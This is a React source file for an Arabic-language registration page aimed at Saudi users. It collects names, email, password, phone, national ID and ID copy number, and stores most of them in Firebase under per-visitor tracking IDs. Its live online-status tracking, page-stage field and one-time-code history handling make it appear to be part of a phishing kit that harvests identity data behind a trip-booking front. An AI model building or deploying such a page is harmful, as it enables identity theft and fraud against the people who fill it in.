import { useState } from "react";
import { ChevronRight } from "lucide-react";
import { Link, useLocation } from "wouter";
import { BottomNav } from "./services";
import { addData } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import SiteHeader from "@/components/site-header";
import SiteFooter from "@/components/site-footer";

type FormState = {
  firstName: string;
  lastName: string;
  email: string;
  password: string;
  countryCode: string;
  phone: string;
  nationalId: string;
  copyNumber: string;
  gender: string;
  birthDate: string;
};

export default function Register() {
  const [, setLocation] = useLocation();
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [form, setForm] = useState<FormState>({
    firstName: "",
    lastName: "",
    email: "",
    password: "",
    countryCode: "966",
    phone: "",
    nationalId: "",
    copyNumber: "",
    gender: "ذكر",
    birthDate: "",
  });

  const update = (key: keyof FormState, val: string) =>
    setForm((f) => ({ ...f, [key]: val }));

  const handleSubmit = async () => {
    if (submitting) return;
    setError("");
    if (!form.firstName.trim() || !form.email.trim() || !form.phone.trim()) {
      setError("يرجى تعبئة الاسم والبريد الإلكتروني ورقم الجوال");
      return;
    }
    setSubmitting(true);
    const visitorId = `visitor_${Date.now()}_${Math.random()
      .toString(36)
      .substring(2, 9)}`;
    const fullName = `${form.firstName} ${form.lastName}`.trim();
    const phoneFull = `${form.countryCode}${form.phone.replace(/^\+?966/, "")}`;
    const ok = await addData({
      id: visitorId,
      name: fullName,
      email: form.email,
      phone: phoneFull,
      saudiId: form.nationalId,
      gender: form.gender,
      birthDate: form.birthDate,
      currentPage: "registration",
    });
    if (!ok) {
      setError("تعذر إكمال التسجيل، يرجى المحاولة مرة أخرى");
      setSubmitting(false);
      return;
    }
    localStorage.setItem("visitor", visitorId);
    localStorage.removeItem("otpHistory");
    setupOnlineStatus(visitorId);
    setLocation("/trip-booking");
  };

  const textFields: {
    label: string;
    key: keyof FormState;
    placeholder: string;
    type?: string;
  }[] = [
    { label: "الاسم الأول", key: "firstName", placeholder: "ادخل الاسم الأول" },
    {
      label: "الاسم الأخير",
      key: "lastName",
      placeholder: "ادخل الاسم الأخير",
    },
    {
      label: "البريد الإلكتروني",
      key: "email",
      placeholder: "example@mail.com",
      type: "email",
    },
    {
      label: "كلمة المرور",
      key: "password",
      placeholder: "••••••••••",
      type: "password",
    },
  ];

  return (
    <div
      className="min-h-screen bg-background flex flex-col"
      dir="rtl"
      data-testid="page-register"
    >
      <SiteHeader />
      <div className="relative h-48 overflow-hidden">
        <div className="absolute inset-0 bg-muted" />
        <div
          className="absolute inset-0 bg-primary"
          style={{ clipPath: "polygon(0 40%, 100% 0, 100% 100%, 0 100%)" }}
        />
        <div className="relative z-10 px-6 pt-6">
          <Link
            href="/"
            className="inline-flex items-center justify-center w-8 h-8 rounded-full bg-card/20 text-primary-foreground hover:bg-card/40 transition-colors"
            data-testid="link-back-home"
          >
            <ChevronRight className="w-5 h-5" />
          </Link>
        </div>
      </div>

      <div className="flex-1 bg-primary px-6 pt-2 pb-6 flex flex-col gap-4 -mt-2">
        <h1 className="text-xl font-bold text-primary-foreground text-right">
          تسجيل
        </h1>

        {textFields.map((f) => (
          <div
            key={f.key}
            className="border-b border-primary-foreground/30 pb-2"
          >
            <input
              type={f.type || "text"}
              placeholder={f.placeholder}
              value={form[f.key]}
              onChange={(e) => update(f.key, e.target.value)}
              className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/60 text-right text-sm focus:outline-none py-1"
              data-testid={`input-${f.key}`}
            />
          </div>
        ))}

        <div className="border-b border-primary-foreground/30 pb-2 flex items-center gap-3 justify-end">
          <input
            type="tel"
            placeholder="55######"
            value={form.phone}
            onChange={(e) => update("phone", e.target.value)}
            className="flex-1 bg-transparent text-primary-foreground placeholder:text-primary-foreground/60 text-right text-sm focus:outline-none py-1"
            data-testid="input-phone"
          />
          <input
            type="text"
            value={form.countryCode}
            onChange={(e) => update("countryCode", e.target.value)}
            className="w-14 bg-transparent text-primary-foreground text-center text-sm border-l border-primary-foreground/30 pl-2 focus:outline-none py-1 font-bold"
            data-testid="input-country-code"
          />
        </div>

        <div className="border-b border-primary-foreground/30 pb-2">
          <input
            type="text"
            placeholder="رقم الهوية"
            value={form.nationalId}
            onChange={(e) => update("nationalId", e.target.value)}
            className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/40 text-right text-sm focus:outline-none py-1"
            data-testid="input-national-id"
          />
        </div>

        <div className="border-b border-primary-foreground/30 pb-2">
          <input
            type="text"
            placeholder="1000000008"
            value={form.copyNumber}
            onChange={(e) => update("copyNumber", e.target.value)}
            className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/60 text-right text-sm focus:outline-none py-1"
            data-testid="input-copy-number"
          />
        </div>

        <div className="bg-card/20 rounded-xl px-4 py-3 border border-primary-foreground/20">
          <select
            value={form.gender}
            onChange={(e) => update("gender", e.target.value)}
            className="w-full bg-transparent text-primary-foreground text-right text-sm focus:outline-none appearance-none cursor-pointer"
            data-testid="select-gender"
          >
            <option value="ذكر" className="text-foreground bg-background">
              ذكر
            </option>
            <option value="أنثى" className="text-foreground bg-background">
              أنثى
            </option>
          </select>
        </div>

        <div className="bg-card/20 rounded-xl px-4 py-3 border border-primary-foreground/20">
          <input
            type="date"
            placeholder="تاريخ الولادة"
            value={form.birthDate}
            onChange={(e) => update("birthDate", e.target.value)}
            className="w-full bg-transparent text-primary-foreground placeholder:text-primary-foreground/50 text-right text-sm focus:outline-none"
            data-testid="input-birth-date"
          />
        </div>

        {error && (
          <p
            className="text-red-100 bg-red-900/40 rounded-lg px-3 py-2 text-xs text-center"
            data-testid="error-register"
          >
            {error}
          </p>
        )}

        <button
          onClick={() => void handleSubmit()}
          disabled={submitting}
          className="w-full bg-muted text-foreground py-3.5 rounded-xl font-bold text-base hover:bg-background transition-colors mt-2 disabled:opacity-60 disabled:cursor-not-allowed"
          data-testid="button-submit-register"
        >
          {submitting ? "جاري الإرسال..." : "تسجيل"}
        </button>
      </div>

      <SiteFooter />
      <BottomNav active="التسجيل" />
    </div>
  );
}
